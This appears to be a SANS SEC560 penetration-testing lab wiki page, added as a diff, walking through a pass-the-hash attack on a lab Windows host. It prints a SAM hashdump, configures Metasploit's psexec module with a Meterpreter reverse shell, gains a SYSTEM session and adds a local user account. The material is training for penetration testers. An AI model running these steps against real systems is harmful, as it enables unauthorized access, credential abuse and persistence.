@@ -1,0 +1,401 @@
+<!DOCTYPE HTML>
+<!--
+    Editorial by HTML5 UP
+    html5up.net | @ajlkn
+    Free for personal and commercial use under the CCA 3.0 license (html5up.net/license)
+
+    560 Wiki made with love and care by the following people:
+    - Tim Medin (@TimMedin, @RedSiegeInfoSec) -- Project Lead, Red Siege Information Security
+    - Erik Van Buggenhout (@@ErikVaBu, @NVISOsecurity) -- Project Lead, NVISO Security
+    - Mick Douglas (@BetterSafetyNet) -- Tech lead, Intern Wrangler, InfoSec Innovations
+        - Yulli Chong -- Intern, InfoSec Innovations
+        - Aaron Sawyer (@CrashingStatic) -- Intern, InfoSec Innovations
+-->
+<html>
+    <head>
+        <title>SANS SEC560 Lab Wiki</title>
+        <meta charset="utf-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
+        <link rel="stylesheet" href="css/main.css" />
+    </head>
+    <body>
+
+        <!-- Wrapper -->
+            <div id="wrapper">
+
+                <!-- Main -->
+                    <div id="main">
+                        <div class="inner">
+
+                            <!-- Header -->
+                                <header id="header">
+                                    <a href="index.html" class="logo">SANS SEC 560 Lab Wiki</a>
+                                    <ul class="icons">
+                                        <li><a href="https://twitter.com/search?q=Sec560" class="icon fa-twitter"><span class="label">Twitter</span></a></li>
+                                    </ul>
+                                </header>
+
+                            <!-- Content -->
+                            <!-- Converted Markdown body (AKA HTML stubs) goes here -->
+<h1 id="lab-46-pass-the-hash">Lab 4.6: Pass the Hash</h1>
+<h2 id="objectives">Objectives</h2>
+<ul>
+<li>To use a pass-the-hash attack via Metasploit&rsquo;s <code>psexec</code> module to load Meterpreter onto a target machine</li>
+<li>To see how we can authenticate to a target Windows machine using only the hash, without using the actual password at all</li>
+</ul>
+<h2 id="lab-setup">Lab Setup</h2>
+<p>Ensure that you can ping 10.10.10.10 in the 560 target environment from your Slingshot Linux image.</p>
+<pre>
+sec560@slingshot:~$ <b>ping 10.10.10.10</b>
+</pre>
+
+<h2 id="lab--step-by-step-instructions">Lab &ndash; Step-by-Step Instructions</h2>
+<p>For this lab, you attack machine <code>10.10.10.10</code> using pass-the-hash to get Meterpreter access of the system using Metasploit&rsquo;s <code>psexec</code>.</p>
+<p>For the hashes, use a SAM hashdump file stored in the Slingshot Linux image. The account to use has a logon name of <code>monk</code> and a hash in the file <code>/home/sec560/coursefiles/sam.txt</code>.</p>
+<p>The whole point of this lab is that you can grab <b>LANMAN</b> and <b>NT</b> hashes and use them for admin access of a target machine without even cracking them. Note that as you proceed through this lab, you never need to know what the actual value of the <code>monk</code> administrative-level password is. You simply use its hashed form to gain access.</p>
+<p><img  class="myImg"  src="pics/Ex4.6_img01.png" style="width:100%;max-width:600px"  alt="Grabbing LANMAN and NT hashes illustration" /></p>
+<h4 id="step-1-hashes">Step 1: Hashes</h4>
+<p>The hashes for 10.10.10.10 are in the <code>/home/sec560/coursefiles/sam.txt</code> file on the Linux machine.</p>
+<p>Start the lab by putting <code>monk</code>&rsquo;s hash into our Linux machine&rsquo;s copy-and-paste buffer. Start by displaying the hashes:</p>
+<pre>
+sec560@slingshot:~$ <b>cat /home/sec560/coursefiles/sam.txt</b>
+Administrator:500:A5C67174B2A219D1AAD3B435B51404EE:363DD639AD34B6C5153C0F51165AB830:::
+charlie:1007:380B4695FE1449EBAAD3B435B51404EE:03F9CC43288014DEE4FA4B190D9CA948:::
+dizzy:1008:3EACDEE7E4395079BE516DA459FE4E65:1274D7B32A9ABDDA01A5067FE9FBB32B:::
+Guest:501:NO PASSWORD*********************:NO PASSWORD*********************:::
+IUSR_BETTY:1001:44BBEBA9892785E7E130321F8EE908E4:B3FCCBDD70138057477303221118715A:::
+IWAM_BETTY:1002:A47109F6BCCBF54BD2E55FDA509B7966:C2DA00DE320C442799D03053EFF7819D:::
+<em>monk:1009:AF83DBF0052EE4717584248B8D2C9F9E:A65C3DA63FDB6CA22C172B13169D62A5:::</em>
+ted:1006:09EEAB5AA415D6E4AAD3B435B51404EE:18DA6C2895C549E266745951D5DC66CB:::
+TsInternetUser:1000:AAC70116CB404F310EB3621B7749050D:5E20E67E47C007014D05B54ADACA11BC:::
+</pre>
+
+<p>Now, on the line with <code>monk</code>&rsquo;s hash, select the hash (starting with <code>AF83</code> and ending with <code>62A5</code>), highlighting that entire string (but with no colon at the beginning or end).</p>
+<p>Then <b>right-click</b> the terminal and select <b>Copy</b>. We&rsquo;ll paste this hash into Metasploit shortly.</p>
+<p><img  class="myImg"  src="pics/Ex4.6_img02.png" style="width:100%;max-width:600px"  alt="Copying from terminal" /></p>
+<h4 id="step-2-launch-metasploit">Step 2: Launch Metasploit</h4>
+<p>Launch the Metasploit Framework Console, as we&rsquo;ve done before, and use the <code>psexec</code> module and set the <code>PAYLOAD</code>:</p>
+<pre>
+sec560@slingshot:~$ <b>msfconsole</b>
+
+# cowsay++
+ ____________
+< metasploit >
+ ------------
+       \   ,__,
+        \  (oo)____
+           (__)    )\
+              ||--|| *
+
+
+       =[ metasploit v5.0.34-dev-58e36b6                  ]
++ -- --=[ 1902 exploits - 1072 auxiliary - 329 post       ]
++ -- --=[ 550 payloads - 44 encoders - 10 nops            ]
++ -- --=[ 2 evasion                                       ]
+
+msf5 > <b>use exploit/windows/smb/psexec</b>
+msf5 exploit(windows/smb/psexec) > <b>set PAYLOAD windows/meterpreter/reverse_tcp</b>
+PAYLOAD => windows/meterpreter/reverse_tcp
+</pre>
+
+<p>Now see what options you need for <code>psexec</code>, using the <code>show options</code> command:</p>
+<pre>
+msf5 exploit(windows/smb/psexec) > <b>show options</b>
+
+Module options (exploit/windows/smb/psexec):
+
+   Name                  Current Setting  Required  Description
+   ----                  ---------------  --------  -----------
+   RHOSTS                                 yes       The target address range or 
+                                                    CIDR identifier
+   RPORT                 445              yes       The SMB service port (TCP)
+   SERVICE_DESCRIPTION                    no        Service description to to be
+                                                    used on target for pretty 
+                                                    listing
+   SERVICE_DISPLAY_NAME                   no        The service display name
+   SERVICE_NAME                           no        The service name
+   SHARE                 ADMIN$           yes       The share to connect to, can
+                                                    be an admin share (ADMIN$,C$
+                                                    ,...) or a normal read/write
+                                                    folder share
+   SMBDomain             .                no        The Windows domain to use 
+                                                    for authentication
+   SMBPass                                no        The password for the 
+                                                    specified username
+   SMBUser                                no        The username to authenticate
+                                                    as
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, 
+                                        thread, process, none)
+   LHOST                      yes       The listen address (an interface may be
+                                        specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+</pre>
+
+<p>We need to set the host to connect to (<code>RHOST</code>), an <code>LHOST</code> for the <code>reverse_tcp</code> payload to connect back to, as well as the user to connect as (<code>SMBUser</code>) and a password (<code>SMBPass</code>). However, for the password, we&rsquo;ll provide hashes (via paste).</p>
+<pre>
+msf5 exploit(windows/smb/psexec) > <b>set RHOST 10.10.10.10</b>
+RHOST => 10.10.10.10
+msf5 exploit(windows/smb/psexec) > <b>set LHOST <i>YOUR_LINUX_IP_ADDRESS</i></b>
+LHOST => 10.10.75.102
+msf5 exploit(windows/smb/psexec) > <b>set SMBUSER monk</b>
+SMBUSER => monk
+</pre>
+
+<p>Next, set the <code>SMBPass</code> variable to the hashes obtained earlier from the <code>/home/sec560/CourseFiles/sam.txt</code> file, pasting them into the shell as before. (They should still be in your copy-and-paste buffer.) <b>Right-click</b> and select <b>Paste</b>.</p>
+<p>In brief, you'll paste something like this:</p>
+<pre>
+msf exploit(psexec) > <b>set SMBPass <i>LANMAN:NT</i></b>
+</pre>
+
+<p>Here is what the output looks like:</p>
+<pre>
+msf5 exploit(windows/smb/psexec) > <b>set SMBPASS AF83DBF0052EE4717584248B8D2C9F9E:A65C3DA63FDB6CA22C172B13169D62A5</b>
+SMBPASS => AF83DBF0052EE4717584248B8D2C9F9E:A65C3DA63FDB6CA22C172B13169D62A5
+</pre>
+
+<p>Run <code>show options</code> to confirm the settings are correct.</p>
+<p>We need to do one more thing. At the time of this writing, there is a bug in MSF5 related to pass-the-hash and the database. We need to disconnect the database by running the following command:</p>
+<pre>
+msf5 exploit(windows/smb/psexec) > <b>db_disconnect</b>
+</pre>
+
+<h4 id="step-3-exploit">Step 3: Exploit</h4>
+<p>Finally, run the <code>exploit</code> command to attack the target:</p>
+<pre>
+msf5 exploit(windows/smb/psexec) > <b>exploit</b>
+
+[*] Started reverse TCP handler on 10.10.75.102:4444
+[*] 10.10.10.10:445 - Connecting to the server...
+[*] 10.10.10.10:445 - Authenticating to 10.10.10.10:445 as user 'monk'...
+[*] 10.10.10.10:445 - Selecting PowerShell target
+[*] 10.10.10.10:445 - Executing the payload...
+[+] 10.10.10.10:445 - Service start timed out, OK if running a command or non-service executable...
+[*] Sending stage (179779 bytes) to 10.10.10.10
+[*] <em>Meterpreter session 1</em> opened (10.10.75.102:4444 -> 10.10.10.10:49521) at 2019-07-09 18:32:10 +0000
+
+meterpreter >
+</pre>
+
+<h5 id="if-your-exploit-fails">If your exploit fails...</h5>
+<p>Failure 1. ActiveRecord If you get an error message of <code>Exploit failed: ActiveRecord ... Data has already been taken</code>, that is due to a small bug in the Metasploit database feature and its interaction with credentials. You can bypass that problem by disconnecting from the database. If you see that error, please type <code>db_disconnect</code> and then try to exploit it again.</p>
+<pre>
+msf5 exploit(windows/smb/psexec) > <b>db_disconnect</b>
+Successfully disconnected from the data service: local_db_service.
+msf5 exploit(windows/smb/psexec) > <b>exploit</b>
+</pre>
+
+<p>Failure 2. Timeout</p>
+<p>If you see the error below and do not get a Meterpreter session, then run <code>exploit</code> again:</p>
+<pre>
+...
+<em>[+] 10.10.10.10:445 - Service start timed out, OK if running a command or non-service executable...</em>
+[*] Exploit completed, but no session was created.
+msf5 exploit(windows/smb/psexec) > <b>exploit</b>
+</pre>
+
+<p>If the pass-the-hash attack works successfully, you should get Meterpreter access to the target machine.</p>
+<p>If you exploit it successfully, you can use that Meterpreter prompt to interact with the target machine.</p>
+<pre>
+meterpreter > <b>getuid</b>
+Server username: <em>NT AUTHORITY\SYSTEM</em>
+</pre>
+
+<h4 id="step-5-meterpreter-shell">Step 5. Meterpreter Shell</h4>
+<p>You can now run any of the Meterpreter commands we discussed earlier in the course.</p>
+<p>As far as Metasploit and target <b>10.10.10.10</b> are concerned, you authenticated to the machine legitimately. You just used the hash instead of the password.</p>
+<pre>
+meterpreter > <b>getpid</b>
+Current pid: <em>3152</em>
+meterpreter > <b>ifconfig</b>
+
+...output truncated for brevity...
+
+Interface 12
+============
+Name         : Intel(R) 82574L Gigabit Network Connection
+Hardware MAC : 00:0c:29:ce:b4:fe
+MTU          : 1500
+IPv4 Address : 10.10.10.10
+IPv4 Netmask : 255.255.0.0
+
+...output truncated for brevity...
+</pre>
+
+<p>Let&rsquo;s use this access of the target to create an account on the machine by launching a <code>cmd.exe</code> shell and then using <code>net user</code> to create an account and set a password.</p>
+<pre>
+meterpreter > <b>shell</b>
+Process 3400 created.
+Channel 1 created.
+Microsoft Windows [Version 6.3.9600]
+(c) 2013 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32> <b>whoami</b>
+ whoami
+<em>nt authority\system</em>
+
+C:\Windows\system32> <b>net user <i>SOME_USER_NAME</i> <i>SOME_PASSWORD</i> /add</b>
+The command completed successfully.
+</pre>
+
+<p>Let&rsquo;s review the accounts created on the machine so far:</p>
+<pre>
+C:\Windows\system32> <b>net user</b>
+</pre>
+
+<p>To finish the lab, you can simply <code>exit</code> your shell, your Meterpreter session, and your <code>msfconsole</code> session.</p>
+<pre>
+C:\Windows\system32> <b>exit</b>
+ exit
+meterpreter > <b>exit</b>
+[*] Shutting down Meterpreter...
+
+[*] 10.10.10.10 - Meterpreter session 4 closed.  Reason: User exit
+msf5 exploit(windows/smb/psexec) > <b>exit</b>
+sec560@slingshot:~$
+</pre>
+
+<h2 id="conclusion">Conclusion</h2>
+<p>In conclusion, in this lab, you&rsquo;ve authenticated to a target machine via <b>SMB</b> as an admin user with only that admin&rsquo;s hash (not the password). You passed the hash using Metasploit&rsquo;s <code>psexec</code> module. These techniques are highly useful for penetration testers who have retrieved hashes from a target environment and have <b>SMB</b> access to target Windows machines.</p>
+
+                        </div>
+                    </div>
+
+                <!-- Sidebar -->
+                    <div id="sidebar">
+                        <div class="inner">
+
+                            <!-- Search -->
+                            <!-- MBD 20180705 - Search feature is disabled for now.  Will enable it once we get OK
+                                <input type="text" name="query" id="query" placeholder="Search" />
+                                    <button onclick="myFunction()">?</button>
+                                        <script>
+                                        function myFunction() {
+                                                var x = document.getElementById("query").value;
+                                               var res =  idx.search(x);
+                                            alert(res);
+                                       </script>
+                            -->
+
+                            <!-- Menu -->
+                                <nav id="menu">
+                                    <header class="major">
+                                        <h2>Menu</h2>
+                                    </header>
+                                    <ul>
+                                        <li><a href="index.html">Homepage</a></li>
+                                        <li><a href="Getting-Started.html">Getting Started</a></li>
+                                        <li>
+                                            <span class="opener">Book 1:</span>
+                                            <ul>
+                                                <li><a href="Lab-1.1-Setting-Up-The-Image.html">Setting Up The Image</a></li>
+                                                <li><a href="Lab-1.2-Scope-and-RoE-Role-Play.html">Scope and RoE Role Play</a></li>
+                                                <li><a href="Lab-1.3-Metadata-Treasure-Hunt.html">Metadata Treasure Hunt</a></li>
+                                                <li><a href="Lab-1.4-Recon-ng-for-DNS-Analysis.html">Recon-ng for DNS Analysis</a></li>
+                                            </ul>
+                                        </li>
+                                        <li>
+                                            <span class="opener">Book 2:</span>
+                                            <ul>
+                                            	<li><a href="Lab-2.1-Nmap.html">Nmap</a></li>
+                                            	<li><a href="Lab-2.2-Nmap-O-sV.html">Nmap -O -sV</a></li>
+                                                <li><a href="Lab-2.3-NSE.html">NSE</a></li>
+                                                <li><a href="Lab-2.4-Nessus.html">Nessus</a></li>
+                                                <li><a href="Lab-2.5-Netcat.html">Netcat</a></li>
+                                                <li><a href="Lab-2.6-PowerShell.html">PowerShell</a></li>
+                                            </ul>
+                                        </li>
+                                        <li>
+                                            <span class="opener">Book 3:</span>
+                                            <ul>
+                                                <li><a href="Lab-3.1-Metasploit.html">Metasploit</a></li>
+                                                <li><a href="Lab-3.2-Meterpreter.html">Meterpreter</a></li>
+                                                <li><a href="Lab-3.3-Veil.html">Veil</a></li>
+                                                <li><a href="Lab-3.4-Port-Pivot-Relays.html">Port Pivot Relays</a></li>
+                                                <li><a href="Lab-3.5-Empire.html">Empire</a></li>
+                                                <li><a href="Lab-3.6-Running-Commands-with-sc-and-WMIC.html">Running Commands with sc and WMIC</a></li>
+                                            </ul>
+                                        </li>
+                                        <li>
+                                            <span class="opener">Book 4:</span>
+                                            <ul>
+                                                <li><a href="Lab-4.1-Hydra-Password-Guessing.html">Hydra Password Guessing</a></li>
+                                                <li><a href="Lab-4.2-MSF-psexec-hashdump-kiwi.html">MSF psexec, hash dumping, and Kiwi</a></li>
+                                                <li><a href="Lab-4.3-MSF-pivots.html">MSF Pivots</a></li>
+                                                <li><a href="Lab-4.4-Cracking-with-JtR-and-Hashcat.html">Cracking with John the Ripper and Hashcat</a></li>
+                                                <li><a href="Lab-4.5-Sniffing-Cracking.html">Sniffing & Cracking</a></li>
+                                                <li><a href="Lab-4.6-Pass-the-Hash.html">Pash the Hash</a></li>
+                                            </ul>
+                                        </li>
+                                        <li>
+                                            <span class="opener">Book 5:</span>
+                                            <ul>
+                                                <li><a href="Lab-5.1-Kerberos.html">Kerberos</a></li>
+                                                <li><a href="Lab-5.2-Responder.html">Responder</a></li>
+                                                <li><a href="Lab-5.3-Bloodhound.html">Bloodhound</a></li>
+                                                <li><a href="Lab-5.4-Privilege-Escalation.html">Privilege Escalation</a></li>
+                                                <li><a href="Lab-5.5-Domain-Dominance.html">Domain Dominance</a></li>
+                                                <li><a href="Lab-5.6-ZAP-Proxy.html">ZAP Proxy</a></li>
+                                                <li><a href="Lab-5.7-Command-Injection.html">Command Injection</a></li>
+                                                <li><a href="Lab-5.8-SQL-Injection.html">SQL Injection</a></li>
+                                            </ul>
+                                        </li>
+                                        <li>
+                                            <span class="opener">Book 6:</span>
+                                            <ul>
+                                                <li><a href="Lab-6.1a-Connecting-to-the-Network.html">Connecting to the Network</a></li>
+                                                <li><a href="Lab-6.1b-Online-CTF-Access.html">Online CTF Access</a></li>
+                                            </ul>
+                                        </li>
+                                        <li>
+                                            <span class="opener">Cheatsheets</span>
+                                            <ul>
+                                                <li><a href="other/MetsploitCheatsheet.pdf">Metasploit</a></li>
+                                                <li><a href="other/NetcatCheatSheetV1.pdf">Netcat</a></li>
+                                                <li><a href="other/WindowsCommandLineSheetV1.pdf">Windows Command Line</a></li>
+                                            </ul>
+                                        </li>
+                                    </ul>
+                                </nav>
+
+
+
+                            <!-- Footer -->
+                                <footer id="footer">
+                                    <p class="copyright">&copy; Tim Medin<br>
+                                        All rights reserved. <br>
+                                        Design: <a href="https://html5up.net">HTML5 UP</a>.</p>
+                                </footer>
+
+                        </div>
+                    </div>
+
+            </div>
+
+            <!-- The Modal -->
+            <div id="myModal" class="modal">
+                <span class="close">&times;</span>
+                <img class="modal-content" id="img01">
+                <div id="caption"></div>
+            </div>
+
+        <!-- Scripts -->
+            <script src="js/jquery.min.js"></script>
+            <script src="js/skel.min.js"></script>
+            <script src="js/util.js"></script>
+            <script src="js/main.js"></script>
+
+    </body>
+</html>
